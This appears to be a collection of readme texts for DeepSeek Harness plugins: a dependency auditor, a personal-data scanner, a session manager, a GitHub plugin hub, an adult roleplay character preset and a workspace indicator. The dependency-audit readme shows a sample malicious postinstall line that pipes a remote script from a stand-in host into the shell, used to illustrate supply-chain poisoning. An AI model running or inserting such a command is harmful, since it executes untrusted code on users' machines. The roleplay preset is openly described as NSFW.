plugins.readme_text:
# @deepwhale-cn/dsh-dep-audit

[![Listed on dsh-plugin.org](https://dsh-plugin.org/badges/listed.svg)](https://dsh-plugin.org/plugins/feely0208/dsh-dep-audit)


**防供应链攻击与恶意依赖**：装包即执行的脚本、过宽版本、非 registry 来源，都在这一条命令里查完。

**关键词**：依赖投毒 · 供应链攻击 · 恶意依赖 · npm 投毒 · postinstall 脚本 · 供应链安全 · 依赖审计
**Keywords**: dependency poisoning · supply chain attack · malicious package · npm supply chain · postinstall script
**依赖投毒与风险** —— 装包即执行的脚本、过宽版本、非 registry 来源。

## 不装它会怎样

你 `npm install` 了一个看起来正常的包。

它的 `postinstall` 脚本里有一行 `curl evil.example/x.sh | sh` ——
**在你装它的那一刻就执行了**，你甚至没在代码里 import 过它。

近年的大规模 npm 投毒事件（event-stream、ua-parser-js、node-ipc、colors/faker）**全是这条路**。

## 它查什么

| 级别 | 内容 |
|---|---|
| 🔴 高 | 依赖带 install/postinstall 脚本 |
| 🟡 中 | 没有 lockfile · 版本用 `*`/`latest` · git/http 来源 |
| 🟢 低 | `>=x.y.z` 无上界 |

## 安装

```bash
dsh plugin --profile web add @deepwhale-cn/dsh-dep-audit
# 或纯 CLI
npx @deepwhale-cn/dsh-dep-audit
```

## 用法

```bash
dsh-dep-audit                 # 扫当前目录
dsh-dep-audit --demo          # 看检出效果
dsh-dep-audit --html r.html   # HTML 报告
```

![dsh-dep-audit 检查报告示例](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/report.png)

![dsh-dep-audit 演示模式输出](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/demo.png)

![dsh-dep-audit 规则与依据](https://www.deepwhale.org.cn/plugin-assets/dsh-dep-audit/rules.png)

## 边界

- **带 install 脚本 ≠ 恶意** —— `esbuild`/`sharp`/`puppeteer` 这类必须有，已在白名单里。
  报出来的需要你人工确认。
- **不查 CVE 漏洞库**、**不做包名相似度检测**（typosquat 误报率高）。

本插件是一个工具。使用者必须遵守所在地区法律法规，**对使用本项目造成的任何后果自行承担责任。**

plugins.readme_text:
# @deepwhale-cn/dsh-data-scan

[![Listed on dsh-plugin.org](https://dsh-plugin.org/badges/listed.svg)](https://dsh-plugin.org/plugins/feely0208/dsh-data-scan)


**防数据泄露**：扫出代码与配置里的身份证、银行卡、手机号 —— 带校验位验证，不误报。

**关键词**：敏感数据 · 个人信息 · 身份证号 · 银行卡号 · 手机号 · 数据泄露 · 隐私数据 · 个人信息保护法 · PII
**Keywords**: sensitive data · PII · personal information · ID card · bank card · phone number · data leak
**敏感数据发现** —— 扫出代码和配置里的身份证、银行卡、手机号。

**带校验位验证**，不是纯正则。

## 不装它会怎样

你为了调试方便，把一段**真实的用户数据**放进了测试文件，然后提交了。

仓库后来开源了。三个月后有人告诉你：**那批身份证号能被搜到**。

这个检查跑一次几秒钟。

## 它查什么

| 级别 | 类型 | 校验 |
|---|---|---|
| 🔴 高 | 身份证号 | GB 11643-1999 **加权校验位** |
| 🔴 高 | 银行卡号 | **Luhn 算法** |
| 🟡 中 | 手机号 | 号段 + **边界断言** |
| 🟢 低 | 邮箱 | 结构匹配（提示性质）|

## 为什么值得用（不是「正则扫一遍」）

纯正则会误报一堆：订单号、时间戳、版本号、哈希片段都像。
被误报烦几次你就不会再用这个工具了。

本工具做**结构 + 校验位**双重验证：

```
✅ 11010519491231002X   身份证，校验位对
❌ 11010519491231003X   校验位错 → 不报
✅ 4532015112830366     卡号，Luhn 过
❌ 4532015112830367     改一位 → 不报
❌ 138123456789012345   像手机但 18 位 → 不报
```

## 输出永不含原值

只报「文件:行 + 类型 + 打码片段」。**记原值等于让扫描工具自己成为泄露源。**

## 安装

```bash
dsh plugin --profile web add @deepwhale-cn/dsh-data-scan
# 或纯 CLI
npx @deepwhale-cn/dsh-data-scan
```

## 用法

```bash
dsh-data-scan                 # 扫当前目录
dsh-data-scan --demo          # 看检出效果
dsh-data-scan --html r.html   # HTML 报告
```

![dsh-data-scan 检查报告示例](https://www.deepwhale.org.cn/plugin-assets/dsh-data-scan/report.png)

![dsh-data-scan 演示模式输出](https://www.deepwhale.org.cn/plugin-assets/dsh-data-scan/demo.png)

![dsh-data-scan 规则与依据](https://www.deepwhale.org.cn/plugin-assets/dsh-data-scan/rules.png)

## 边界

- **不扫二进制/图片** —— 截图里的身份证、PDF 里的表格扫不到。
- **不查 .git 历史** —— 只看到当前工作区，已提交过的需另做历史清理。
- 与 [dsh-bundle-cn-skills](https://github.com/feely0208/dsh-bundle-cn-skills) **不重叠**：那个查密钥，这个查个人信息。

本插件是一个工具。使用者必须遵守所在地区法律法规，**对使用本项目造成的任何后果自行承担责任。**

---

## 深鲸网安守护系列（共 31 个）

> 一个插件做一件事。**安全问题是链式的** —— 配套用才完整。

**国内合规** ｜ [等保对照](https://github.com/feely0208/dsh-cn-mlps) · [日志留存](https://github.com/feely0208/dsh-cn-log-retention) · [备案公示](https://github.com/feely0208/dsh-cn-filing) · [用户同意](https://github.com/feely0208/dsh-consent-guard) · [个人信息权利](https://github.com/feely0208/dsh-data-rights) · [未成年人保护](https://github.com/feely0208/dsh-minor-guard) · [影响评估](https://github.com/feely0208/dsh-pipia) · [数据分类分级](https://github.com/feely0208/dsh-data-classify) · [算法备案](https://github.com/feely0208/dsh-algorithm-filing) · [数据出境](https://github.com/feely0208/dsh-cn-data-export) · [国密合规](https://github.com/feely0208/dsh-cn-crypto) · [AI 内容标识](https://github.com/feely0208/dsh-cn-ai-labeling)

# dsh-session-tool

会话太多删不掉？归档只是隐藏、记录还躺在磁盘上？想给一个会话换个名字还要翻菜单？

**给 DSH 补上会话管理：侧栏「⋯」菜单一键删除（永久删除、可配置），对话区头部一键重命名。**

> ⚠️ **删除是永久删除，不可恢复**（本插件没有回收站）。删除**正在运行**的会话时，会**先停止该会话，然后再删除**。

![界面示意](docs/preview.png)

## 安装

```sh
# npm
dsh plugin --profile <profile> add dsh-session-tool

# 本地目录
dsh plugin --profile <profile> add file:C:/path/to/dsh-session-tool

# GitHub
dsh plugin --profile <profile> add github:<owner>/dsh-session-tool
```

装完**重启 DSH**。`<profile>` 替换成你的 profile 名（如 `web`、`desktop`）。

## 功能

- **⋯ 菜单「删除会话」**：文案、顺序、显隐、红色危险样式、禁用态都可配置
- **头部「重命名会话」✏️**：走官方 `sessions` 服务，改完侧栏与头部标题即时更新
- **一次确认**：勾选「我已了解后果」才能点删除（未勾选时按钮禁用）
- **永久删除 + 先停止**：运行中的会话先 `cancel` 并等静默（最多 15 秒），再 flush/detach，最后删除目录并清理记账
- **官方悬停按钮可隐藏**：归档 / 置顶两个图标按钮（只支持 `hidden`）
- **审计日志**：配置问题与每一次删除都写 `~/.dsh/logs/dsh-session-tool.log`

## 配置

写在 profile 的 `cordis.patch.yml`（`~/.dsh/profiles/<profile>/cordis.patch.yml`），**键名区分大小写**，改完**重启 DSH** 生效。
**只写你要改的部分**，没写的键全部用默认值。

### 完整 schema

```yaml
- id: dsh-session-tool
  name: dsh-session-tool
  config:
    MenuItems:                     # ⋯ 菜单里的项
      official:                    # 官方 4 项（不写 = 一个都不碰）
        pin:     { }               # 可写：label / activeLabel / order / hidden
        rename:  { }               # 只支持 hidden（重命名对话框是官方内部实现）
        fork:    { }               # 可写：label / order / hidden
        archive: { }               # 可写：label / activeLabel / order / hidden
      plugin:
        delete:
          label: "删除会话"         # 文案（留空 = 跟随系统语言）
          order: 500               # 顺序，越小越靠前
          hidden: false            # true = 隐藏这一项
          danger: true             # 红色危险样式
          disabled: false          # 禁用态：变灰、点不动
          shortcut: null           # 【已登记，本阶段未实现】
          separatorBefore: false   # 【已登记，本阶段未实现】
    ButtonItems:                   # 会话行悬停时的图标按钮
      official:
        archive: { hidden: false } # 只支持 hidden
        pin:     { hidden: false } # 只支持 hidden（已归档的行上本来也不显示）
      plugin: { }                  # 占位：本插件不提供悬停按钮
```

### order 参考值

`order` 是普通数字，**升序排列**：越小越靠前；**不写等于 0**（会排在最前面）；数字相同则按注册顺序（官方先注册，排在我们前面）。

| order | 菜单项 | 来源 | 能否修改 |
| --- | --- | --- | --- |
| 100 | 置顶会话 `pin` | 官方 | label / activeLabel / order / hidden |
| 200 | 重命名 `rename` | 官方 | ⚠️ 只能 hidden |
| 300 | 分叉会话 `fork` | 官方 | label / order / hidden |
| 400 | 归档会话 `archive` | 官方 | label / activeLabel / order / hidden |
| 500 | 删除会话 `delete` | 本插件（默认） | 全部字段 |

| order | 悬停按钮 | 来源 | 能否修改 |
| --- | --- | --- | --- |
| 100 | 归档按钮 | 官方 | ⚠️ 只能 hidden |
| 200 | 置顶按钮 | 官方 | ⚠️ 只能 hidden |

### 我的配置（实际在用的）

```yaml
# order 参考：官方 pin 100 / rename 200 / fork 300 / archive 400；本插件 delete 默认 500
- id: dsh-session-tool
  name: dsh-session-tool
  config:
    MenuItems:                     # ⋯ 菜单里的项
      official:                    # 官方 4 项：不写就不碰
        pin: {}                    # 可写：label / activeLabel / order / hidden
        rename: {}                 # 只支持 hidden
        fork: {}                   # 可写：label / order / hidden
        archive: {}                # 可写：label / activeLabel / order / hidden
      plugin:
        delete:                    # 本插件唯一的菜单项
          label: "删除会话"
          order: 500
          hidden: false
          danger: true             # 红色危险样式
          disabled: false          # 禁用态（变灰、点不动）
    ButtonItems:                   # 会话行【悬停时】的图标按钮
      official:
        archive:
          hidden: true             # 隐藏官方悬停「归档」按钮
        pin:
          hidden: true             # 隐藏官方悬停「置顶」按钮
      plugin: {}                   # 占位：本插件不提供悬停按钮
```

## 界面

| 位置 | 内容 |
| --- | --- |
| 侧栏会话行「⋯」菜单 | 「删除会话」（文案/顺序/显隐/危险样式/禁用态可配） |
| 对话区头部工具栏 | ✏️「重命名会话」（该排最左侧） |
| 会话行悬停区 | 官方归档/置顶按钮（可隐藏）；本插件不提供悬停按钮 |

**删除弹窗四态**

| 状态 | 触发 | 表现 |
| --- | --- | --- |
| 正常 | 会话在列表且未运行 | 副标题「删除后，该对话将不可恢复」+ 勾选框 + 删除按钮（未勾选时禁用） |
| 运行中 | 会话正在运行 | 多一行 ⚠「会话正在运行 —— 删除会立即中断它正在进行的任务」，勾选框与按钮变成「停止并删除」 |
| 会话不存在 | 列表里找不到该会话 | 提示刷新后重试，隐藏勾选框、禁用删除按钮 |
| 删除成功 | 删除完成 | 「已删除」+「该对话已永久删除，无法恢复。」+ 完成按钮 |

**重命名**：输入框预填当前名称、自动聚焦；名称为空时「确定」禁用；回车提交、Esc 取消；失败在弹窗内显示原因。

## 实现说明

**删除链路**（六步）

1. 界面校验：回环地址 + 同源请求（其他来源 403，方法不对 405）
2. 运行中的会话：`cancel` 取消回合并等待静默（最多 15 秒）
3. `flush` 写盘 + 从内存会话表 `detach`，避免收尾阶段把日志目录重建回来
4. **删除磁盘目录**（收尾再扫一遍）—— 这一步是永久删除，文件不进入任何回收目录
5. 清理记账：投影缓存行、投影缓存文件、工作区 `sessionIds`、归档集合
6. 写审计日志

**加载稳健性**

- 客户端 `apply` **必须同步完成**：任何 `await`（尤其是网络请求）都可能让入口永远停在 `loading`
- 界面配置在后台读取（3 秒超时、失败重试 5 次 × 2 秒），到达后自动重建注册；读不到就用默认值
- 宿主的三条 HTTP 路由按**进程级单例**注册（同进程重复加载时复用，不撞 `duplicate exact route`）

**官方悬停按钮的隐藏是怎么实现的（维护提示）**

插槽契约写着「复用官方 id 就会替换那一行」，但实测**跨插件不可靠**：框架给每个插件各自分配注册优先级，
官方注册的条目数量多、计数更靠前，于是官方那行仍然胜出。所以本插件改用 **DOM/CSS 级隐藏**：

```html
<style id="dsh-session-tool-hide-shipped">
  button[aria-label="归档会话"],button[aria-label="取消归档"],
  button[aria-label="Archive session"],button[aria-label="Unarchive session"],
  button[aria-label="置顶会话"],button[aria-label="取消置顶"],
  button[aria-label="Pin session"],button[aria-label="Unpin session"] { display: none !important; }
</style>
```

> ⚠️ **维护提示**：这段选择器依赖官方按钮的 `aria-label` 文案（中英各 2 种状态，共 8 条）。
> 如果 DSH 更新后官方改了这些文案（或新增状态），隐藏会失效 —— 此时只需在 `lib/client.js` 的
> `ARCHIVE_LABELS` / `PIN_LABELS` 两个数组里补上新文案即可。日志里每次加载都会记录 `cssRules=<条数>`，可用来核对。

## 日志

`~/.dsh/logs/dsh-session-tool.log`（超过 1 MB 轮转为 `.log.1`）

```
[2026-10-16T09:08:44.519Z] delete ok     id=session-9cc49402-…  title="创建三个空子智能（9cc49402）"  running=false  stopped=false  dirs=1  elapsed=0.0s
[...] plugin info   HTTP 路由已注册：/list /config /diag /delete
[...] config warn   未知的配置键 "menuItems" → 你是否想写 "MenuItems"？（键名区分大小写）
[...] client info   config #1: ok | changed=true | hiddenButtons=archive,pin | cssRules=8
```

配置写错**不会**打断 DSH 启动，只会记一行日志并忽略该项。

## 卸载

```sh
dsh plugin --profile <profile> remove dsh-session-tool
```

## 更新日志

完整版本记录见 [`changelog/CHANGELOG.md`](changelog/CHANGELOG.md)。

## 许可

MIT

---

# dsh-session-tool

Too many sessions and no way to remove them? Archiving only hides a session while its files stay on disk? Renaming a session means digging through menus?

**Session management for DSH: delete from the sidebar "..." menu (permanent, configurable) and rename from the conversation header.**

> ⚠️ **Deletion is permanent and unrecoverable** (there is no trash). Deleting a **running** session first stops it, then removes it.

![UI overview](docs/preview.png)

## Installation

```sh
# npm
dsh plugin --profile <profile> add dsh-session-tool

# local checkout
dsh plugin --profile <profile> add file:C:/path/to/dsh-session-tool

# GitHub
dsh plugin --profile <profile> add github:<owner>/dsh-session-tool
```

Restart DSH afterwards. Replace `<profile>` with your profile name (e.g. `web`, `desktop`).

## Features

- **"..." menu item "Delete session"**: label, order, visibility, danger styling and disabled state are all configurable
- **Header "Rename session"** (pencil): uses the official `sessions` service, so the sidebar and header titles update live
- **Single confirmation**: the delete button stays disabled until "I understand the consequences" is ticked
- **Permanent delete, stop-first**: a running session is cancelled and awaited (up to 15 s), flushed and detached, then its directories are removed and the accounting is cleaned
- **Official hover buttons can be hidden**: the archive and pin icons (only `hidden` is supported)
- **Audit log**: configuration problems and every deletion are written to `~/.dsh/logs/dsh-session-tool.log`

## Configuration

Put it in the profile patch file `~/.dsh/profiles/<profile>/cordis.patch.yml`. **Keys are case-sensitive** and changes apply after **restarting DSH**.
**Only write what you want to change** - everything omitted keeps its default.

### Full schema

```yaml
- id: dsh-session-tool
  name: dsh-session-tool
  config:
    MenuItems:                     # items in the "..." menu
      official:                    # the 4 shipped items (omitting one leaves it untouched)
        pin:     { }               # writable: label / activeLabel / order / hidden
        rename:  { }               # hidden only (its dialog is official internals)
        fork:    { }               # writable: label / order / hidden
        archive: { }               # writable: label / activeLabel / order / hidden
      plugin

# dsh-github-hub — a GitHub plugin hub for DeepSeek Harness

A native DSH panel (host half + browser half) that signs in to your GitHub account, keeps a
sign-in history, searches GitHub / npm for `deepseek-harness` (`dsh-plugin`) plugins, and installs
them into the current profile with one click — through exactly the same path as
**Settings → Plugins** and `dsh plugin add`.

Chinese documentation: [README.zh.md](./README.zh.md)

---

## What it adds

* **Discover** — search GitHub repositories (`topic:dsh-plugin`, `topic:deepseek-harness`,
  `dsh-plugin in:name,description,readme`, …) or npm packages (`keywords:dsh-plugin`).
  *Inspect* reads the repository's `package.json` and tells you whether it really is an
  installable DSH plugin (does it declare `dsh.bundle.patch`? does it ship a `dsh.client` half?).
  *Install* runs the profile's own pnpm path with a live log, cancel support, and an
  "allow the blocked build scripts and retry" button when pnpm withholds lifecycle scripts.
* **Installed** — the profile's bundles and plugin rows, with enable / disable / remove,
  load errors and read-only reasons.
* **Account** — sign in with a **Personal Access Token** or **OAuth Device Flow**
  (bring your own OAuth App `client_id`; no client secret needed). Sign-in / sign-out history
  is persisted and can be cleared.
* **Diagnostics** — a connectivity report for the GitHub API, npm, DNS, the hosts file, `git`
  and `pnpm`, plus which rung of the TLS trust ladder the current requests use.

## Install

```sh
dsh plugin --profile desktop add dsh-github-hub
# local development
dsh plugin --profile desktop add link:/absolute/path/to/dsh-github-hub
```

Then **restart the desktop app** — reloading the page is not enough, because DSH collects its boot
injection table once per host start, and a new plugin's client bundle only enters that manifest on
the next start (the web profile needs its `dsh web` process restarted for the same reason).
A **git-branch icon** then appears in the left sidebar and opens the panel in the central area.

## Read-only endpoints

Beyond the panel, the host half exposes a few read-only endpoints for troubleshooting (all require
the browser session cookie):

| Endpoint | Purpose |
|---|---|
| `GET /dsh-github/state` | account, settings, sign-in history, trust ladder, client-bundle graph state |
| `GET /dsh-github/health` | GitHub API, npm, DNS, hosts, git, pnpm checks plus plain-language notes |
| `GET /dsh-github/client` | the graph `rev` and real URL of the client bundle, next to the `rev` computed from the file on disk (a mismatch means edits are not loaded yet) |
| `GET /dsh-github/search?source=github\|npm&q=…` | search |
| `POST /dsh-github/repo/package` | read a repository's `package.json` and judge it |
| `POST /dsh-github/inspect` | pre-flight one spec through the real plugin manager (performs the GitHub connection check, installs nothing) |

## Verified on this machine

* the GitHub API is reachable through the local accelerator at `tls=default` (144 system roots were
  merged into the process default chain at startup), so no insecure rung was needed;
* `pnpm add github:<owner>/<repo>` and `pnpm add git+https://github.com/<owner>/<repo>.git` both
  fetch and link a real package (37s and 19s, peer dependencies included);
* the official pipeline `pluginManager.installBundle` completed end to end for a `link:` spec
  (pnpm log events → progress polling → bundle activation);
* `POST /inspect` on `github:<owner>/<repo>` returns `{status:'accepted', kind:'git', host:'github.com'}`;
* the fences hold: authenticated 200, no cookie 401, `sec-fetch-site: cross-site` 403.

## Signing in

* **Token (recommended)** — create one at <https://github.com/settings/tokens> with `read:user`
  (add `repo` for private repositories) and paste it into the panel.
  It is stored in the DSH credential service as the record `dsh-github-hub/github`
  (kind `grant`) and is **never** sent to the page; the UI only shows login, avatar, scopes and
  the last four characters.
* **Device flow** — create an OAuth App (no client secret required), paste its `client_id`,
  start the flow, enter the one-time code at <https://github.com/login/device>.

## Data

| Item | Location |
|---|---|
| GitHub token | DSH credential service (record `dsh-github-hub/github`) |
| Settings + sign-in history | `$DSH_HOME/.dsh-github-hub.json` (no token, max 200 entries) |
| Install logs | `$DSH_PROFILE_DIR/.plugin-manager/logs/operation-*/pnpm.log` |

All endpoints live under `ctx.webServer` at `/dsh-github/*` behind three fences: loopback (or
explicitly trusted) Host, no cross-site requests, and write requests accepted only from the
local machine.

## GitHub behind a local interceptor

Accelerators such as Watt Toolkit / Steam++ rewrite `github.com`, `api.github.com` and
`raw.githubusercontent.com` to `127.0.0.1` and re-serve them through a local reverse proxy with
its own CA, which Node does not trust by default (`unable to verify the first certificate`).
This plugin walks a trust ladder instead of failing:

1. default trust chain;
2. default roots **plus** the operating system root store (equivalent to `node --use-system-ca`);
3. trust the local interceptor — only when the peer genuinely resolves to loopback **and** the
   setting is enabled, and the UI always reports `tls: local-interceptor` when it happens.

Installing from GitHub uses pnpm's `github:owner/repo` (git) transport, so **`git` must be on
PATH**; the plugin manager performs a bounded connection check before pnpm starts.

## Known limits

* A freshly installed plugin usually still needs an app restart (or page reload) before its
  sidebar icon appears — DSH collects the index injection table once at startup.
* Installing a third-party plugin executes third-party host code inside your DSH process.
  The panel shows repository metadata and the `package.json` verdict, but does not audit code.
* Removing a bundle does not delete data files the third-party plugin wrote under `$DSH_HOME`.

## License

MIT — see [LICENSE](./LICENSE).

# dsh-sylphiette-agent · 希露菲 把《无职转生》的**希露菲耶特（Sylphiette）**做成 DeepSeek Harness（DSH）的一个角色扮演预设： 装上之后，新建会话时选「希露菲」就能直接和她对话。 - **全中文人设**：身份、外貌、性格、成长经历、说话方式（含"括号内第三人称 / 引号内第一人称"的对话标记规则） - **453 条六面世界设定**：魔法、剑术流派、种族、地理、国家、组织、魔道具、学园规则…… 按对话**自动调取**（命中关键词才注入），另有 `lore_lookup` 工具可主动检索 - **剧情**：她只钟情于你（原卡的三角恋线已删除） - **尺度**：成人向（NSFW） > ⚠️ **本预设包含成人向内容，仅供成年人在本地个人使用。** 请勿传播、转售或用于商业用途。 > 这是《无职转生》的非官方同人二创，原作版权属于理不尽な孫の手及相关出版方。 --- ## 安装 本包是一个标准的 DSH **profile bundle**（`package.json` 里的 `dsh.bundle.patch` 指向 `cordis.patch.yml`）， 所以官方途径和手动兜底都行。 ### 方式一：官方命令（推荐） ```bash # 普通（dsh web / 非桌面版）——把 换成你的 profile 名，通常是 web 或 default dsh plugin --profile add github:JunYingLingLan/dsh-sylphiette-agent ``` **Desktop（桌面版应用）用户注意**：桌面版把自己的 `desktop` profile 锁给了 Electron 进程， 直接用全局 `dsh` 会报 `profile "desktop" is managed exclusively by the Electron application`。 请改用桌面版自带的 CLI，或干脆用 GUI： ```powershell # Windows： 换成你装 DeepSeek Harness 的地方 & "\resources\runtime\cli\bin\dsh.cmd" plugin --profile desktop add github:JunYingLingLan/dsh-sylphiette-agent ``` 或者：打开 DSH 界面 → 侧栏**插件** → 添加插件 → 把包名/URL 粘进去。 > `github:` 这种写法需要机器上有 **git**（DSH 会先 `git ls-remote` 探一下）。 > 没装 git 的话，用下面的 tarball 写法或方式二。 **不想装 git？用 Release 里的 tgz**（`dsh plugin` 支持 tarball URL，不需要 git）： ```bash dsh plugin --profile add https://github.com/JunYingLingLan/dsh-sylphiette-agent/releases/download/v1.0.1/dsh-sylphiette-agent-1.0.1.tgz ``` ### 方式二：兜底脚本（不碰 pnpm、不需要 git、不需要 DSH CLI） 适合桌面版用户，或者在官方途径上卡住的时候： ```bash # 先把仓库下载/克隆到本地，进入包根目录，然后： node bin/install.mjs # 先预览，什么都不改 node bin/install.mjs --apply # 真正安装 ``` 它会： 1. 把整包拷到 `/dsh-sylphiette-agent/`（默认 `~/.dsh`，Windows 是 `C:\Users\你\.dsh`） 2. 把包内的 `cordis.patch.yml` 声明内联进 `/profiles//cordis.patch.yml`， 并把插件路径转成绝对 `file://` URL 3. 备份原来的 patch，然后逐项验证 可选参数：`--home `、`--profile <名字>`、`--patch <文件>`、`--uninstall --apply`。 自动探测失败时先加 `--home` 指明位置。 ### 装完之后 —— 必须重启一次 ⚠️ **装完请重启 DeepSeek Harness**（桌面版关掉再打开；`dsh web` 用户重启那个进程）。 实测结论：**新装的 bundle 不会被 HMR 自动加载**。装完立刻看是看不到「希露菲」的——组合产物 （`profiles//cordis.yml`）里也不会有它，因为那份配置是在装包**之前**就组合好的。 重启后配置重新组合，希露菲才会出现在预设列表里。 重启后：新建会话 → Agent 预设 选「希露菲」。 ### v1.0.1 修了什么 v1.0.0 里插件行写的是相对路径 `./lib/sylphiette-lore.mjs`，那是错的： DSH 的 `anchorInsertedPluginNames` 只转换 patch `insert` **本层**的 name（以及 `group.config` 那种形式）， **不会递归进 preset 行 `config.plugins` 里的嵌套插件行**。于是这个相对名被当作相对 **profile 目录**解析 （`profiles/

/lib/...` 并不存在）→ 模块 import 失败 → 插件 fiber 永远起不来。 现象很隐蔽：**persona 是纯文本 config 所以照样生效（人设对），但世界书和 `lore_lookup` 全哑**。 v1.0.1 改用**包名子路径** `dsh-sylphiette-agent/lore` —— 由 DSH 从 profile 的 `node_modules` 解析（`createRequire(baseUrl).resolve(...)`，与 `dsh-astrbot-ingress` 同一机制）。 兜底安装器 `bin/install.mjs` 则把它落成安装位置的绝对 `file://` URL。 ## 她是谁 20 岁，四分之一精灵，白发红眼尖耳。对外是阿斯拉王国第三公主爱丽儿的男装护卫「沉默的菲兹」， 在拉诺亚魔法大学读书，擅长无咏唱施法。**私下只对你一个人软**—— 你就是她童年唯一的光：教她无咏唱施法的人、转移事件里和她一起活下来的人、两年里和她过着双重生活的人。 ## 世界书是怎么工作的（为什么不用把 453 条全塞进去） 453 条设定约 2.7 万 token。全部塞进系统提示的话，每一轮对话都要付这个成本，还会把真正重要的对话挤到角落。 所以本包用插件 `lib/sylphiette-lore.mjs` 做两条通道： - **自动调取**：你这轮（及上一轮）说的话命中某个关键词时，对应条目才会被加进系统提示； 没命中就不加（返回空串的段会被 DSH 丢掉，不留残留）。 - **主动查询**：模型可以调用 `lore_lookup` 工具查任意条目（按关键词或编号）。 关键词做了三层匹配，因为译出来的键常常是「爱丽儿的护卫」这种描述性长词，而你嘴里说的是「爱丽儿」： | 层 | 例子 | 权重 | |---|---|---| | 完整键 | 爱丽儿的护卫 | 2 | | 按「的 / · / 、」切分的片段 | 爱丽儿、菲兹 | 1 | | 剥掉类别后缀（王国 / 大学 / 流 / 魔法…） | 阿斯拉王国 → 阿斯拉 | 1 | 想调节强度：改 `cordis.patch.yml` 里 `sylphiette-lore` 的 `maxEntries`（单轮最多注入几条）、 `maxChars`（字符上限）、`scanTurns`（回看几轮）、`excludeUids`（不想自动注入的条目编号）。 ## 改成你想要的样子 人设正文在 `cordis.patch.yml` 的 `persona.config.prefix`（一大段中文 YAML 块标量）。 改完**必须重新安装**（内容是被内联进 profile 的，DSH 不会自动监视）： ```bash node bin/install.mjs --apply # 方式二装的 # 或 dsh plugin --profile add # 官方方式装的（升级＝卸载重装） ``` ⚠️ 两个坑：人设里**不能出现 `{{...}}`**（DSH 的提示词插值遇到未知变量会直接报错），也不能有 Tab。 ## 卸载 ```bash node bin/install.mjs --uninstall --apply ``` 或走官方：`dsh plugin --profile remove dsh-sylphiette-agent`。 ## 包结构 ``` package.json name / bin / dsh.bundle.patch cordis.patch.yml bundle 声明：preset 行 + persona + sylphiette-lore lib/sylphiette-lore.mjs 世界书插件（关键词自动注入 + lore_lookup 工具） data/lorebook.zh.json 453 条中文设定 bin/install.mjs 兜底安装器 ``` ## 来源与许可 - 角色卡原作：SillyTavern 角色卡 `Sylphiette`（作者 **tupapichulo69**） - 世界观资料：`main_The Six Sided World Lorebook (Mushoku Tensei)_world_info`（453 条） - 本包的改动：全部译成简体中文、删除鲁迪乌斯相关感情线、尺度调整、世界书改为按需注入 - 《无职转生》版权属于原作者**理不尽な孫の手**及相关出版方；本包是非官方同人二创，请仅作个人娱乐 代码部分以 MIT 许可发布（见 `LICENSE`），其中附加的同人/成人向使用说明请一并遵守。

plugins.description: DeepSeek Harness plugin: show a running / just-finished indicator on sidebar workspace rows
plugins.readme_text:
# dsh-workspace-activity

**English** · [简体中文](README.zh.md)

Marks each workspace in the sidebar while one of its sessions is running.

A session row already shows a spinner while it runs. This plugin puts the same
spinner on the **workspace row above it**, so a collapsed or scrolled workspace
list still tells you which project is busy without expanding anything.

```
📁 dsh-workspace                    ◌      ← added by this plugin
   ◌ 处理所有 skill 同步到已同步      刚刚
```

## Install

```sh
dsh plugin --profile <name> add dsh-workspace-activity
```

Restart dsh, or reload the page. The plugin is a bundle, so it also works
through the plugin market and any other bundle-aware client.

## What it does

The sidebar shows no indicator on a workspace row today. The plugin derives one
from the same status feed the session rows use, so the two agree:

- A workspace is marked when at least one of its sessions is running.
- Subagent sessions are skipped. The sidebar folds them into their parent's row
  and never draws one of its own, and their ids belong to no workspace, so a mark
  from one would have no row to sit on.
- Sessions the sidebar hides as archived are skipped. This matches the default
  view. The sidebar's archive filter can also show archived sessions, and the
  plugin cannot see which setting is active — it is not part of what
  `@deepseek-ai/dsh-client-ui-workspace` exposes — so with the filter set to show
  archived sessions, a running archived row can appear under an unmarked
  workspace.
- The status feed is authoritative; the session list is the fallback, matching
  the precedence the workspace browser itself uses.
- The mark is a spinner at the row's trailing edge, in the same 16px slot the
  session rows use for their timestamps, drawn with the product's own theme
  token and stroke geometry.
- A **collapsed** workspace also tints its folder glyph with the same blue the
  browser paints on the group you are inside. Collapsed rows hide their
  sessions, so the glyph has to carry the state alone; an expanded row already
  shows its sessions and keeps the browser's own colouring.
- Readers who cannot see it get the count and the workspace names through a
  visually hidden description.

## How it works

A workspace row declares no slot, so there is no supported place to render into.
The plugin instead contributes a stylesheet that decorates the row the sidebar
already renders. It writes nothing to the document, observes nothing, and appends
no nodes: the rule targets the row's trailing pseudo-element and React keeps
owning the row.

This is the one thing to know before installing it: **the rule targets the
sidebar's `data-row-key` attribute**, which is an internal detail of
`@deepseek-ai/dsh-client-ui-workspace` rather than a published contract. If a
future release renames it, the spinner stops appearing until the plugin is
updated. Nothing else breaks — the plugin never mutates the DOM, so a stale
selector degrades to "no indicator", not to a broken sidebar.

## Requirements

- A Web (or desktop) client — this is a client-only plugin, `dsh.client.platform: web`.
- No host services, no configuration, no permissions.

## Development

Written in TypeScript; `src/` is the source of truth and `lib/` is generated
(and committed — see below). The scripts under `scripts/` are TypeScript too and
run straight through Node's type stripping, which needs Node 22.18 or newer; no
separate runner is involved.

```sh
npm install
npm run build     # tsdown -> lib/, then wraps the Client half in the module envelope
npm run check     # typecheck + lint + format check + build + verify
```

| Script                    | What it does                                                     |
| ------------------------- | ---------------------------------------------------------------- |
| `build`                   | Emits `lib/index.js` and `lib/client.js`.                        |
| `verify`                  | Loads the built Client half and renders it with a real renderer. |
| `typecheck`               | `tsc --noEmit`.                                                  |
| `lint` / `lint:fix`       | Oxlint, type-aware, with the React hooks rules.                  |
| `format` / `format:check` | Prettier.                                                        |
| `check`                   | Everything above, in the order CI would run it.                  |

`build` runs `scripts/wrap-client.ts` after tsdown: the Client half has to
reach the browser as a `window.__ModuleLoader__.load({ id, factory })` call
whose `id` is the package name, and the wrapper supplies that envelope.

`lib/` is committed on purpose, and this package deliberately declares no
lifecycle script. pnpm refuses to install a git-hosted package that has one
unless the consumer allowlists it, which would make the plugin uninstallable
straight from the repository; with no script to run, `add` simply consumes the
committed output. Run `npm run build` after changing `src/`.

`verify` is not a mock of the sidebar. It captures the factory the envelope
registers, drives `apply` against a stub context, and renders the registered
component with `react-test-renderer` — enough to prove the envelope, the
registration, and the stylesheet the entry publishes. The running sidebar is
still the only place the indicator's position and colour can be judged.

## License

MIT

plugins.description: Tencent Meeting plugin for DeepSeek Harness with user-supplied local credentials and explicit approval.
plugins.readme_text:
